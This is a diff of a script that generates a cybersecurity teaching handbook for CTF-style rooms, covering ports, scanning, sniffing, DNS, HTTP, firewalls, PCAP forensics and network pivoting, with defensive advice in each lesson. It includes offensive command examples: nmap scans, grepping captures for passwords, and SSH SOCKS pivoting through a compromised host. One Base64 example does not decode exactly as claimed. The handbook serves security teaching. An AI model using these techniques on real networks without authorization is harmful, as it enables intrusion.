@@ -11,9 +11,1484 @@ fs.mkdirSync(outDir, { recursive: true })
 const htmlPath = path.join(outDir, 'BreachKeep_Student_Handbook.html')
 const pdfPath = path.join(outDir, 'BreachKeep_Student_Handbook.pdf')
 
-console.log('Generating BreachKeep Student Teaching Handbook HTML...')
+console.log('Generating Enhanced BreachKeep Student Teaching Handbook...')
 
-const htmlContent = `<!DOCTYPE html>
+// Rich educational data for all 28 rooms
+const chapters = [
+  {
+    number: 1,
+    id: 'signals',
+    title: 'Signals: Computer Networking & Protocol Analysis',
+    subtitle: 'Understanding the Wire: How the Modern World Communicates in Packets',
+    introduction: `
+      <h3>The Teacher's Welcome to Computer Networking</h3>
+      <p>
+        Welcome to your first steps into the invisible nervous system of civilization. Every tap on your smartphone, 
+        every video streamed across oceans, and every financial transaction settling in real-time relies on a foundation 
+        laid out in the late 1970s and 1980s: packet-switched networking.
+      </p>
+      <p>
+        When beginners hear about "cybersecurity", they often imagine futuristic cinematic scenes of flashing green code. 
+        In reality, cybersecurity is fundamentally about understanding <strong>protocols</strong>. A protocol is simply 
+        an agreed-upon etiquette—a shared language—between two machines that do not inherently trust one another.
+      </p>
+      <div class="callout analogy">
+        <strong>The Postal Metaphor of Networking:</strong>
+        Imagine you want to send a 500-page book to a friend living on another continent. The post office refuses to accept packages larger than an envelope. 
+        What do you do? You tear the book into 500 individual pages, place each page into a numbered envelope, write the recipient's full address on the front, 
+        and write your return address on the back. The postal trucks will route each envelope across different airplanes, trains, and delivery vans. 
+        Some envelopes might arrive out of order, and one might get lost in a rainstorm. 
+        Your friend at the receiving end must wait for the envelopes, reassemble them in numerical order, and send you a postcard asking you to resend page 42 if it never arrived.
+        <br><br>
+        <strong>That is TCP/IP.</strong> The book is your data, the envelopes are IP packets, the trucks are routers, and the patient reassembly process is TCP.
+      </div>
+      <h3>The Two Foundational Models: OSI vs. TCP/IP</h3>
+      <p>
+        In theoretical computer science, we teach the <strong>OSI 7-Layer Model</strong> (Physical, Data Link, Network, Transport, Session, Presentation, Application). 
+        In the real world, the engineering standard that runs the global internet is the <strong>TCP/IP 4-Layer Model</strong>:
+      </p>
+      <table>
+        <thead>
+          <tr>
+            <th>Layer</th>
+            <th>Primary Function</th>
+            <th>Key Protocols</th>
+            <th>Real-World Analogy</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong>Application</strong></td>
+            <td>User-facing data format and semantic meaning</td>
+            <td>HTTP, DNS, SSH, SMTP, FTP</td>
+            <td>The letter inside the envelope written in English</td>
+          </tr>
+          <tr>
+            <td><strong>Transport</strong></td>
+            <td>Process-to-process delivery, reliability, flow control</td>
+            <td>TCP (reliable stream), UDP (fast datagrams)</td>
+            <td>Certified mail tracking receipt vs. regular postcard</td>
+          </tr>
+          <tr>
+            <td><strong>Network (Internet)</strong></td>
+            <td>Host-to-host routing across disparate physical networks</td>
+            <td>IPv4, IPv6, ICMP, ARP</td>
+            <td>Street address and postal zip code on the envelope</td>
+          </tr>
+          <tr>
+            <td><strong>Link (Network Interface)</strong></td>
+            <td>Node-to-node hop across local physical hardware</td>
+            <td>Ethernet (802.3), Wi-Fi (802.11)</td>
+            <td>The delivery truck driver tires rolling over the highway asphalt</td>
+          </tr>
+        </tbody>
+      </table>
+      <div class="callout teacher-tip">
+        <strong>The Golden Axiom of Network Security:</strong>
+        <em>"Packets do not lie, but headers can be forged."</em> Everything on a network is a sequence of voltage fluctuations or light pulses 
+        interpreted as bits. If you know how the protocol state machine works, you can diagnose problems that leave other engineers completely baffled.
+      </div>
+    `,
+    challenges: [
+      {
+        id: 'network-ports',
+        title: '1.1 Ports & Sockets: The Digital Apartment Complex',
+        slug: 'network-ports',
+        concept: 'Transport Layer Multiplexing (TCP/UDP Ports)',
+        incident: 'The 2016 Mirai Botnet swept the entire IPv4 Internet hunting for open Telnet ports (TCP 23) using default credentials to assemble a massive DDoS weapon.',
+        lecture: `
+          If an IP address identifies a building, a <strong>port number</strong> identifies the specific apartment door inside that building. 
+          Your computer only has one network cable or Wi-Fi antenna, yet you can browse websites, listen to music on Spotify, and chat on Discord simultaneously. 
+          How does the operating system know which incoming packet belongs to which application?
+          <br><br>
+          The answer is <strong>multiplexing</strong>. The OS assigns a 16-bit number (from 0 to 65,535) called a port to each communicating program. 
+          Together, an IP address and a port form a <strong>Socket</strong> (e.g., <code>192.168.1.10:8080</code>).
+        `,
+        underTheHood: `
+          The port space is standardized by the Internet Assigned Numbers Authority (IANA) into three tiers:
+          <ul>
+            <li><strong>Well-Known Ports (0 – 1023):</strong> Reserved for core system infrastructure (e.g., Port 22 = SSH, Port 53 = DNS, Port 80 = HTTP, Port 443 = HTTPS). On Unix/Linux systems, binding to these ports historically requires root privileges.</li>
+            <li><strong>Registered Ports (1024 – 49151):</strong> Assigned to specific commercial applications and services (e.g., Port 3306 = MySQL, Port 27017 = MongoDB).</li>
+            <li><strong>Dynamic / Ephemeral Ports (49152 – 65535):</strong> Temporary ports allocated by your operating system when your client initiates an outbound connection.</li>
+          </ul>
+          When a service starts, it invokes the <code>bind()</code> and <code>listen()</code> system calls, instructing the kernel network stack to buffer any incoming traffic destined for that port.
+        `,
+        playbook: `
+          To inspect open listening sockets on a system without installing heavy third-party software:
+          <pre><code># Show all TCP listening sockets with process names and port numbers
+ss -tlnp
+
+# Or the classic netstat command:
+netstat -tulpn</code></pre>
+          When you run <code>ss -tlnp</code>, look at the <code>Local Address</code> column:
+          <ul>
+            <li><code>127.0.0.1:8080</code> means the service is bound ONLY to the local loopback interface. Outside hackers on the network cannot reach it.</li>
+            <li><code>0.0.0.0:8080</code> or <code>[::]:8080</code> means the service is bound to ALL network interfaces. Anyone who can reach your IP can talk to that service.</li>
+          </ul>
+        `,
+        defense: `
+          <strong>The Principle of Least Network Exposure:</strong>
+          <ol>
+            <li>Never bind internal services (databases, admin consoles, debuggers) to <code>0.0.0.0</code>. Always bind them to <code>127.0.0.1</code> unless external access is strictly necessary.</li>
+            <li>Regularly audit listening sockets on production servers as part of automated CI/CD security baselines.</li>
+            <li>Disable or uninstall unused legacy daemons (e.g., telnetd, rsh, daytime).</li>
+          </ol>
+        `,
+        question: 'Why do operating systems allocate random ephemeral ports for client connections rather than reusing port 80 for both client and server?'
+      },
+      {
+        id: 'network-scan',
+        title: '1.2 Network Reconnaissance: Knocking on Every Door',
+        slug: 'network-scan',
+        concept: 'Active Port Scanning & TCP Handshake Probing',
+        incident: 'In nearly every recorded Advanced Persistent Threat (APT) intrusion, such as the Stuxnet campaign or SolarWinds lateral movement, automated network scanning was the essential first phase of network mapping.',
+        lecture: `
+          Before an attacker or a security auditor can evaluate a target, they must answer a basic question: <em>"What doors are unlocked?"</em>
+          Network scanning is the digital equivalent of an inspector walking down a hotel corridor, gently rattling every doorknob to see which rooms are open, which are locked, and which doors are bolted shut behind solid firewalls.
+        `,
+        underTheHood: `
+          To understand port scanning, we must look at the <strong>TCP Three-Way Handshake</strong>:
+          <pre><code>Client (Scanner)                      Server (Target)
+       |                                     |
+       |  1. SYN (Synchronize: "Let's talk") |
+       |------------------------------------>|
+       |                                     |
+       |  2. SYN-ACK ("I'm ready, ack=1")    |
+       |<------------------------------------|
+       |                                     |
+       |  3. ACK ("Acknowledged! Established")|
+       |------------------------------------>|</code></pre>
+          A scanner probes how the target responds to an unsolicited SYN packet:
+          <ul>
+            <li><strong>Port is OPEN:</strong> Target responds with <code>SYN-ACK</code>. The service is listening and waiting for connections.</li>
+            <li><strong>Port is CLOSED:</strong> Target responds with a <code>RST</code> (Reset) packet. The operating system kernel is actively rejecting connections because no program is bound to that port.</li>
+            <li><strong>Port is FILTERED:</strong> Target sends <em>no response</em> (or sends an ICMP Type 3 Unreachable). A firewall dropped the packet silently in transit.</li>
+          </ul>
+          In a <strong>SYN Stealth Scan</strong> (Nmap's <code>-sS</code>), the scanner sends a <code>RST</code> immediately upon receiving the <code>SYN-ACK</code>, tearing down the connection before the application layer logs a completed session.
+        `,
+        playbook: `
+          Using Nmap (Network Mapper) like a professional security engineer:
+          <pre><code># Fast SYN stealth scan across top 1000 ports:
+nmap -sS -T4 10.10.10.5
+
+# Full sweep of all 65,535 TCP ports:
+nmap -sS -p- -T4 10.10.10.5
+
+# Banner grab and service version detection:
+nmap -sV -sC -p 80,443,8080 10.10.10.5</code></pre>
+        `,
+        defense: `
+          <strong>Defensive Countermeasures:</strong>
+          <ul>
+            <li>Configure firewalls to <strong>DROP</strong> unsolicited packets rather than rejecting them with RST. This forces scanners to wait through long timeouts, dramatically slowing down reconnaissance.</li>
+            <li>Deploy Intrusion Detection Systems (IDS) like Snort or Suricata with rules that trigger on rapid TCP SYN rate anomalies from single IP addresses.</li>
+          </ul>
+        `,
+        question: 'What is the key difference between an Nmap Connect scan (-sT) and a SYN scan (-sS) in terms of operating system privileges and application logging?'
+      },
+      {
+        id: 'network-banner',
+        title: '1.3 Service Fingerprinting & Banner Grabbing: Listening to the Hello',
+        slug: 'network-banner',
+        concept: 'Application-Layer Protocol Negotiation & Information Leakage',
+        incident: 'The catastrophic 2017 Equifax breach occurred because an internet-facing portal publicly broadcasted its exact outdated Apache Struts version, allowing attackers to immediately weaponize CVE-2017-5638.',
+        lecture: `
+          Imagine meeting a stranger on the street who introduces themselves by saying: <em>"Hello! My name is John Doe, born March 14, 1985, running Windows 11 Build 22631, and my security guard went to lunch 5 minutes ago."</em>
+          <br><br>
+          You would think they talk too much. Yet that is exactly what unhardened web, FTP, and SSH servers do by default. When you connect, they proudly announce their exact software vendor, version number, and operating system in a <strong>service banner</strong>.
+        `,
+        underTheHood: `
+          When an application connection establishes, many protocols mandate or permit an initial greeting:
+          <ul>
+            <li><strong>SSH:</strong> The RFC mandates exchanging protocol versions immediately: <code>SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6</code>.</li>
+            <li><strong>HTTP:</strong> Web servers frequently include a <code>Server</code> header: <code>Server: Apache/2.4.41 (Ubuntu) mod_ssl/2.4.41 OpenSSL/1.1.1f</code>.</li>
+            <li><strong>SMTP:</strong> Mail transfer agents announce their domain and MTA daemon: <code>220 mail.corporate.internal ESMTP Postfix (Ubuntu)</code>.</li>
+          </ul>
+          To an attacker, exact version numbers eliminate guesswork. They do not need to blindly test exploits; they look up the exact Common Vulnerabilities and Exposures (CVE) database records matching that version.
+        `,
+        playbook: `
+          How to perform manual banner grabbing across common ports:
+          <pre><code># Grab raw banner using Netcat:
+nc -vn 192.168.1.50 22
+
+# Grab HTTP server headers using curl:
+curl -I http://192.168.1.50:8080
+
+# Interactive TCP probe with Telnet:
+telnet 192.168.1.50 25</code></pre>
+        `,
+        defense: `
+          <strong>Minimizing Information Disclosure:</strong>
+          <ul>
+            <li><strong>In Nginx:</strong> Set <code>server_tokens off;</code> in <code>/etc/nginx/nginx.conf</code> to hide the version number.</li>
+            <li><strong>In Apache:</strong> Set <code>ServerTokens Prod</code> and <code>ServerSignature Off</code> in <code>security.conf</code>.</li>
+            <li><strong>In Node.js/Express:</strong> Call <code>app.disable('x-powered-by')</code> or use the <code>helmet</code> middleware.</li>
+          </ul>
+        `,
+        question: 'Why is banner hiding considered "defense in depth" rather than a standalone security solution?'
+      },
+      {
+        id: 'network-capture',
+        title: '1.4 Packet Sniffing & Traffic Analysis: Reading Postcards in the Mail',
+        slug: 'network-capture',
+        concept: 'Promiscuous Mode & Unencrypted Protocol Vulnerability',
+        incident: 'The creation of "Firesheep" in 2010 allowed anyone sitting in a Starbucks to hijack Facebook and Twitter accounts with a single click because session cookies were transmitted over unencrypted HTTP.',
+        lecture: `
+          By default, your computer's network card behaves like a polite mail clerk: it glances at the destination MAC address on incoming frames, and if the frame is not addressed to your machine or the broadcast address, it quietly throws it away.
+          <br><br>
+          However, a network card can be placed into <strong>Promiscuous Mode</strong>. In this mode, the card ignores destination addressing and passes <em>every single packet</em> passing across the physical wire or Wi-Fi channel straight up to the operating system for inspection.
+        `,
+        underTheHood: `
+          If communication protocols transmit data in cleartext (such as HTTP, Telnet, FTP, or unencrypted DNS), anyone with tap access on the local segment (or an attacker running ARP poisoning) can reconstruct the entire session:
+          <pre><code>Captured Frame (Hex Dump):
+47 45 54 20 2f 61 70 69  2f 6c 6f 67 69 6e 20 48   GET /api/login H
+54 54 50 2f 31 2e 31 0d  0a 41 75 74 68 6f 72 69   TTP/1.1..Authori
+7a 61 74 69 6f 6e 3a 20  42 61 73 69 63 20 63 47   zation: Basic cG
+46 7a 63 33 64 76 63 6d  51 36 53 32 56 35 63 41   Fzc3dvcWQ6S2V5cA
+3d 3d 0d 0a                                        ==..</code></pre>
+          In the dump above, the credentials are encoded in Base64 (<code>cGFzc3dvcWQ6S2V5cA==</code>), which is trivial to decode back into plaintext <code>password:Key</code> within milliseconds.
+        `,
+        playbook: `
+          Using <code>tcpdump</code> to capture and analyze network traffic from the command line:
+          <pre><code># Capture traffic on eth0, printing ASCII & Hex, without resolving hostnames:
+tcpdump -i eth0 -nn -X port 80
+
+# Capture and write packets to a raw PCAP file for Wireshark inspection:
+tcpdump -i eth0 -nn -w capture.pcap 'tcp port 80 or tcp port 21'
+
+# Read a PCAP file and filter for string patterns:
+tcpdump -r capture.pcap -A | grep -i "password"</code></pre>
+        `,
+        defense: `
+          <strong>Eradicating Cleartext Protocols:</strong>
+          <ul>
+            <li>Enforce end-to-end cryptographic encapsulation: Replace HTTP with HTTPS (TLS 1.3), Telnet with SSH, FTP with SFTP, and DNS with DoH (DNS over HTTPS).</li>
+            <li>Configure switches with <strong>Dynamic ARP Inspection (DAI)</strong> and <strong>Port Security</strong> to mitigate ARP poisoning and eavesdropping.</li>
+          </ul>
+        `,
+        question: 'Why does Base64 encoding fail to qualify as encryption, and what cryptographic property does TLS provide that Base64 lacks?'
+      },
+      {
+        id: 'network-dns',
+        title: '1.5 The Domain Name System: The Internet\'s Global Phonebook',
+        slug: 'network-dns',
+        concept: 'Hierarchical Name Resolution & Resource Record Exploitation',
+        incident: 'Dan Kaminsky discovered a fundamental flaw in DNS query ID randomization in 2008 that enabled attackers to poison DNS cache servers globally within 10 seconds, silently hijacking web traffic for entire countries.',
+        lecture: `
+          Computers love numbers; humans love words. It is easy for a human to remember <code>breachkeep.internal</code>, but routers only understand binary IP addresses like <code>10.10.42.5</code>.
+          The <strong>Domain Name System (DNS)</strong> is the world's largest, most robust distributed database. It translates human-friendly hostnames into machine-routable IP addresses within milliseconds.
+        `,
+        underTheHood: `
+          DNS queries run over UDP port 53 (and TCP port 53 for large responses). A DNS database contains various <strong>Resource Records (RR)</strong>:
+          <table>
+            <thead>
+              <tr>
+                <th>Record Type</th>
+                <th>Purpose</th>
+                <th>Example Value</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>A</strong></td>
+                <td>Maps a hostname to an IPv4 address</td>
+                <td><code>breachkeep.internal -> 10.10.0.10</code></td>
+              </tr>
+              <tr>
+                <td><strong>AAAA</strong></td>
+                <td>Maps a hostname to an IPv6 address</td>
+                <td><code>breachkeep.internal -> 2001:db8::1</code></td>
+              </tr>
+              <tr>
+                <td><strong>CNAME</strong></td>
+                <td>Canonical Name (alias for another domain)</td>
+                <td><code>www.breachkeep.internal -> breachkeep.internal</code></td>
+              </tr>
+              <tr>
+                <td><strong>TXT</strong></td>
+                <td>Arbitrary text metadata (used for SPF, DKIM, verification)</td>
+                <td><code>"v=spf1 include:_spf.google.com ~all"</code></td>
+              </tr>
+            </tbody>
+          </table>
+          Because <code>TXT</code> records can hold arbitrary strings up to 255 characters per string, administrators use them for verification, while attackers frequently abuse them for <strong>DNS Tunneling</strong> (covertly smuggling data or C2 instructions through firewalls that only allow port 53).
+        `,
+        playbook: `
+          Querying DNS records with modern command-line tools:
+          <pre><code># Query specific TXT records from a target nameserver:
+dig @127.0.0.1 -p 53 breachkeep.internal TXT
+
+# Inspect all available records with nslookup:
+nslookup -type=TXT secret.internal 127.0.0.1
+
+# Trace the full iterative delegation tree:
+dig +trace breachkeep.internal</code></pre>
+        `,
+        defense: `
+          <strong>DNS Hardening:</strong>
+          <ul>
+            <li>Implement <strong>DNSSEC</strong> (DNS Security Extensions) to digitally sign DNS zones, preventing cache poisoning and forgery.</li>
+            <li>Restrict DNS Zone Transfers (<code>AXFR</code>) so only authorized secondary nameservers can download entire domain maps.</li>
+            <li>Monitor outbound DNS query volume to detect DNS tunneling data exfiltration.</li>
+          </ul>
+        `,
+        question: 'Why does DNS primarily use UDP instead of TCP for standard queries, and when does it automatically failover to TCP?'
+      },
+      {
+        id: 'network-http',
+        title: '1.6 The Hypertext Transfer Protocol: The Language of the Web',
+        slug: 'network-http',
+        concept: 'Stateless ASCII Request/Response Protocol Mechanics',
+        incident: 'The 2021 Log4Shell (CVE-2021-44228) vulnerability exploited unescaped JNDI lookup strings sent inside benign-looking HTTP User-Agent and X-Forwarded-For headers.',
+        lecture: `
+          Every web page you have ever visited was transferred using HTTP. At its core, HTTP is remarkably simple: it is a human-readable, plain-text request-and-response protocol that operates over a reliable TCP stream.
+          <br><br>
+          When you click a link, your browser writes a formatted text memorandum onto the TCP connection, sends an empty line to signal the end of the request, and waits for the server to reply with its own formatted response.
+        `,
+        underTheHood: `
+          A raw HTTP/1.1 request adheres to strict formatting governed by CRLF (<code>\\r\\n</code>) line breaks:
+          <pre><code>GET /api/status HTTP/1.1           <-- [Method] [Path] [Version]
+Host: breachkeep.internal          <-- [Headers: Key: Value]
+User-Agent: Mozilla/5.0
+Accept: application/json
+                                   <-- [Mandatory Empty Line: \\r\\n\\r\\n]</code></pre>
+          The server responds with a 3-digit status code:
+          <ul>
+            <li><strong>2xx Success:</strong> <code>200 OK</code> (Request completed successfully).</li>
+            <li><strong>3xx Redirection:</strong> <code>301 Moved Permanently</code>, <code>302 Found</code>.</li>
+            <li><strong>4xx Client Error:</strong> <code>400 Bad Request</code>, <code>401 Unauthorized</code>, <code>403 Forbidden</code>, <code>404 Not Found</code>.</li>
+            <li><strong>5xx Server Error:</strong> <code>500 Internal Server Error</code>, <code>502 Bad Gateway</code> (upstream server failed to reply).</li>
+          </ul>
+        `,
+        playbook: `
+          Inspecting and manipulating raw HTTP with <code>curl</code>:
+          <pre><code># Make a verbose request to view full request and response headers:
+curl -v http://breachkeep.internal/api/status
+
+# Send a custom header or change the HTTP method:
+curl -X POST -H "X-Student-Token: Alpha9" -d '{"action":"unlock"}' http://127.0.0.1:8080/flag
+
+# Download only response headers:
+curl -I http://breachkeep.internal/</code></pre>
+        `,
+        defense: `
+          <strong>Secure HTTP Implementation:</strong>
+          <ul>
+            <li>Enforce <strong>HTTPS (TLS)</strong> globally to prevent eavesdropping and in-transit header tampering.</li>
+            <li>Reject malformed request headers with strict web server parsing to mitigate HTTP Request Smuggling attacks.</li>
+          </ul>
+        `,
+        question: 'What is the semantic purpose of the Host header in HTTP/1.1, and how does it enable virtual hosting of hundreds of websites on a single IP address?'
+      },
+      {
+        id: 'network-protocol-id',
+        title: '1.7 Protocol Identification & Heuristics: Recognizing Unknown Tongues',
+        slug: 'network-protocol-id',
+        concept: 'Deep Packet Inspection & Magic Byte Signature Recognition',
+        incident: 'Advanced malware like Cobalt Strike and ShadowBrokers exploits frequently disguise their command-and-control channels on port 80 or 443 to bypass naive port-based corporate egress filters.',
+        lecture: `
+          A common mistake made by junior administrators is assuming that whatever is running on port 80 must be a web server, or whatever is on port 22 must be SSH.
+          <br><br>
+          In reality, port numbers are merely suggested conventions! A server administrator (or a malicious hacker) can bind an SSH daemon to port 443, or run a secret IRC chat server on port 53. To know what a service actually is, you must inspect its <strong>protocol signature</strong>.
+        `,
+        underTheHood: `
+          Every network protocol exhibits distinct behavioral signatures:
+          <ul>
+            <li><strong>Banner Emitters:</strong> Services like SSH, FTP, and SMTP transmit a greeting the millisecond a TCP connection is established without waiting for the client.</li>
+            <li><strong>Client-First Protocols:</strong> HTTP, TLS, and DNS remain completely silent upon connection, waiting for the client to send a valid request before responding.</li>
+            <li><strong>Magic Bytes:</strong> Binary protocols start with distinctive byte sequences (e.g., TLS handshakes start with <code>0x16 0x03</code>, MySQL handshakes start with packet length followed by protocol version).</li>
+          </ul>
+        `,
+        playbook: `
+          Investigating an unknown port:
+          <pre><code># Step 1: Connect with netcat and see if it speaks first:
+nc -vn 127.0.0.1 9000
+
+# Step 2: Send a standard newline or HTTP probe:
+echo -e "GET / HTTP/1.0\\r\\n\\r\\n" | nc -vn 127.0.0.1 9000
+
+# Step 3: Run Nmap service version detection to match against 10,000+ protocol probes:
+nmap -sV --version-all -p 9000 127.0.0.1</code></pre>
+        `,
+        defense: `
+          <strong>Next-Generation Firewalling (NGFW):</strong>
+          Do not rely on simple Layer-4 port blocking. Deploy protocol-aware Layer-7 inspection engines that verify traffic matches legitimate protocol RFC specifications regardless of the port number.
+        `,
+        question: 'If an adversary tunnels an interactive SSH session over port 443, how can a Layer-7 firewall distinguish it from legitimate HTTPS traffic?'
+      },
+      {
+        id: 'network-firewall',
+        title: '1.8 Firewalls & Packet Filtering: The Digital Bouncer',
+        slug: 'network-firewall',
+        concept: 'Packet Inspection, Rule Evaluation Order & Netfilter Architecture',
+        incident: 'The 2019 Capital One breach stemmed from a Server-Side Request Forgery (SSRF) flaw combined with overly permissive AWS internal security group firewall rules that allowed unauthorized access to metadata endpoints.',
+        lecture: `
+          A firewall is the bouncer standing at the doorway of your operating system. It inspects every packet arriving at the network interface and asks a series of questions: <em>"Where did you come from? Where are you going? Are you part of an existing conversation?"</em>
+          <br><br>
+          If the packet violates security policy, the firewall either sends a rejection notice (<code>REJECT</code>) or silently drops it into the void (<code>DROP</code>).
+        `,
+        underTheHood: `
+          Linux firewalls are powered by the kernel's <strong>Netfilter</strong> framework, controlled via <code>iptables</code> or <code>nftables</code>.
+          Rules are evaluated in strict <strong>sequential order from top to bottom</strong>:
+          <pre><code>Packet Ingress ---> [ PREROUTING ]
+                          |
+                   [ Routing Decision ]
+                     /              \\
+         (To Local Box)          (To Another Host)
+               |                         |
+          [ INPUT ]                 [ FORWARD ]
+               |                         |
+         [ Local App ]              [ POSTROUTING ] ---> Packet Egress</code></pre>
+          Crucial rule concepts:
+          <ul>
+            <li><strong>Stateful Inspection (conntrack):</strong> Allows return traffic automatically for connections established by the local machine (<code>-m state --state ESTABLISHED,RELATED -j ACCEPT</code>).</li>
+            <li><strong>Default Policy:</strong> The golden rule is <strong>Default DROP</strong>. If no rule explicitly matches the packet, drop it immediately.</li>
+          </ul>
+        `,
+        playbook: `
+          Examining and diagnosing firewall configurations in Linux:
+          <pre><code># List all active IPv4 firewall rules with line numbers and packet counters:
+sudo iptables -L -n -v --line-numbers
+
+# Check the UFW (Uncomplicated Firewall) status:
+sudo ufw status verbose
+
+# Allow traffic to a specific port from a specific IP subnet:
+sudo iptables -A INPUT -p tcp -s 192.168.1.0/24 --dport 22 -j ACCEPT</code></pre>
+        `,
+        defense: `
+          <strong>Defensive Architecture Principles:</strong>
+          <ol>
+            <li>Always place specific whitelist rules at the top, followed by a catch-all <code>DROP</code> rule at the bottom.</li>
+            <li>Enforce egress filtering: servers should only be permitted to initiate outbound connections to necessary update repositories and APIs.</li>
+          </ol>
+        `,
+        question: 'Why is a stateful firewall vastly superior to a stateless packet filter when protecting internal client workstations browsing the web?'
+      },
+      {
+        id: 'network-pcap-forensics',
+        title: '1.9 PCAP Forensics: The Flight Recorder of the Wire',
+        slug: 'network-pcap-forensics',
+        concept: 'Post-Incident Network Forensics & Stream Reassembly',
+        incident: 'During the forensic investigation of the 2014 Sony Pictures breach, investigators pieced together the exact malware staging commands and credential dumps by reconstructing historical packet captures.',
+        lecture: `
+          When an airplane encounters an anomaly, investigators retrieve the "black box" flight data recorder. In computer networks, our flight data recorder is the <strong>PCAP (Packet Capture)</strong> file.
+          <br><br>
+          Logs can be deleted, altered, or disabled by attackers who gain root privileges on a compromised server. But an out-of-band network tap capturing raw packets cannot be rewritten after the fact. The wire never lies.
+        `,
+        underTheHood: `
+          A PCAP file contains raw byte streams wrapped in timestamps and capture headers. 
+          To extract meaning from thousands of fragmented packets, forensic analysts perform <strong>TCP Stream Reassembly</strong>:
+          rebuilding the sequence of packets using TCP sequence and acknowledgment numbers to re-create the exact files, images, or chat messages transmitted across the wire.
+        `,
+        playbook: `
+          Using command-line forensics tools to extract intelligence from PCAP files:
+          <pre><code># Extract all unique HTTP Host headers and User-Agents using tshark:
+tshark -r incident.pcap -Y 'http.request' -T fields -e ip.src -e http.host -e http.user_agent
+
+# Filter for DNS queries to identify malicious domains:
+tshark -r incident.pcap -Y 'dns.flags.response == 0' -T fields -e dns.qry.name | sort -u
+
+# Carve files transferred over HTTP using tcpflow:
+tcpflow -r incident.pcap -o ./extracted_streams/</code></pre>
+        `,
+        defense: `
+          <strong>Incident Response Readiness:</strong>
+          Maintain rolling full-packet or metadata captures (using Zeek/Bro) on core network choke points with strict encryption and access controls on the storage volumes.
+        `,
+        question: 'If all traffic on your network is encrypted with modern TLS 1.3, what valuable forensic artifacts can you still extract from a PCAP capture without the private keys?'
+      },
+      {
+        id: 'network-pivot',
+        title: '1.10 Network Pivoting: Stepping Across Virtual Bridges',
+        slug: 'network-pivot',
+        concept: 'Multi-Homed Routing, Lateral Movement & Tunneling',
+        incident: 'In the infamous 2013 Target breach, attackers gained initial access through an HVAC vendor network connection and pivoted across internal routing bridges to reach the point-of-sale (POS) card processing subnet.',
+        lecture: `
+          Corporate networks are rarely single flat rooms. Instead, they resemble bank vaults within secure compounds: outer perimeter networks (DMZs) are accessible to the public, while the crown-jewel databases sit inside isolated, non-routable private subnets.
+          <br><br>
+          A <strong>pivot host</strong> is a multi-homed system that has network cards plugged into both worlds. Once an auditor or adversary reaches this machine, they can use it as a stepping stone to traverse the bridge into the protected interior.
+        `,
+        underTheHood: `
+          A multi-homed system possesses multiple network interfaces (e.g., <code>eth0</code> with public IP <code>203.0.113.10</code> and <code>eth1</code> with internal IP <code>10.0.5.1</code>).
+          Techniques for pivoting across boundaries:
+          <ul>
+            <li><strong>SSH Port Forwarding:</strong> Creating an encrypted tunnel (<code>ssh -L 8080:10.0.5.100:80 user@pivot</code>) that maps a local workstation port directly to an internal target service.</li>
+            <li><strong>Dynamic SOCKS5 Proxying:</strong> Running <code>ssh -D 1080 user@pivot</code>, turning the SSH connection into a flexible proxy for browser and command-line traffic using <code>proxychains</code>.</li>
+            <li><strong>VPN & Layer-3 Routing:</strong> Enabling kernel IP forwarding (<code>sysctl net.ipv4.ip_forward=1</code>) to route packets across subnets.</li>
+          </ul>
+        `,
+        playbook: `
+          Discovering multi-homed interfaces and setting up an SSH pivot:
+          <pre><code># Check all network interfaces on the compromised host:
+ip -brief address show
+
+# Check the kernel routing table:
+ip route show
+
+# Establish a dynamic SOCKS5 proxy on local port 1080 via the pivot host:
+ssh -D 1080 -N -f cadet@192.168.1.50
+
+# Scan the internal private subnet through the proxy:
+proxychains nmap -sT -Pn 10.0.5.0/24</code></pre>
+        `,
+        defense: `
+          <strong>Micro-Segmentation & Zero Trust:</strong>
+          <ul>
+            <li>Isolate administrative management interfaces onto dedicated out-of-band VLANs with strict bastion jump-box controls.</li>
+            <li>Disable IP forwarding (<code>net.ipv4.ip_forward = 0</code>) on all Linux servers that are not dedicated routers.</li>
+          </ul>
+        `,
+        question: 'Why does an Nmap SYN stealth scan (-sS) fail to work through a standard SOCKS5 proxy like proxychains, forcing you to use a TCP Connect scan (-sT)?'
+      }
+    ]
+  },
+  {
+    number: 2,
+    id: 'trading-post',
+    title: 'The Trading Post: Web Applications & The OWASP Top 10',
+    subtitle: 'The Web is an Illusion of Trust: Deconstructing Browser & Server Architecture',
+    introduction: `
+      <h3>The Teacher's Welcome to Web Application Security</h3>
+      <p>
+        In the 1990s, the World Wide Web was conceived by Tim Berners-Lee as a modest mechanism for academic physicists 
+        to share scientific research papers linked together by hypertext. It was never designed to run banking portals, 
+        medical health records, cloud infrastructure control panels, or global social networks.
+      </p>
+      <p>
+        Over thirty years, developers layered complex technology stacks on top of that basic foundation: 
+        JavaScript engines, dynamic relational databases, CSS layout frameworks, and microservice REST APIs. 
+        Yet beneath this dazzling modern web experience, one simple truth remains:
+      </p>
+      <div class="callout defense-rule">
+        <strong>The Iron Law of Web Security:</strong>
+        <em>"Everything that happens on the user's browser is completely within the user's control. Never trust anything sent across the HTTP connection."</em>
+      </div>
+      <p>
+        The <strong>Open Worldwide Application Security Project (OWASP)</strong> maintains the authoritative guide to 
+        the most critical security risks facing web software today. In this dungeon, we will deconstruct how web vulnerabilities 
+        occur, how attackers think, and how developers build software that cannot be broken.
+      </p>
+    `,
+    challenges: [
+      {
+        id: 'web-recon',
+        title: '2.1 Web Reconnaissance: Looking Through the Shop Window',
+        slug: 'web-recon',
+        concept: 'Attack Surface Mapping, Robots.txt & Exposed Development Artifacts',
+        incident: 'In 2019, hundreds of corporate cloud repositories were breached because developers accidentally committed AWS access keys into publicly accessible .git and .env directories served on web roots.',
+        lecture: `
+          When a burglar contemplates breaking into a storefront, they do not start by swinging a sledgehammer at the front door. 
+          They walk by during daylight hours. They check for cameras. They look to see if the alley door has an old padlock, 
+          or if blueprints are left on the counter.
+          <br><br>
+          In web security, <strong>reconnaissance</strong> is the practice of mapping the full surface of an application before attempting any exploit.
+        `,
+        underTheHood: `
+          Web applications routinely leave behind digital breadcrumbs:
+          <ul>
+            <li><code>/robots.txt</code>: Designed to tell search engine crawlers (Googlebot) which sensitive administrative pages <em>not</em> to index. Ironically, this provides attackers with an exact roadmap of high-value internal paths!</li>
+            <li><code>/sitemap.xml</code>: An XML document listing every public URL structure.</li>
+            <li>Exposed backups & VCS folders: Files like <code>.env</code>, <code>server.js.bak</code>, or <code>.git/HEAD</code> left in public document roots by lazy deployment scripts.</li>
+          </ul>
+        `,
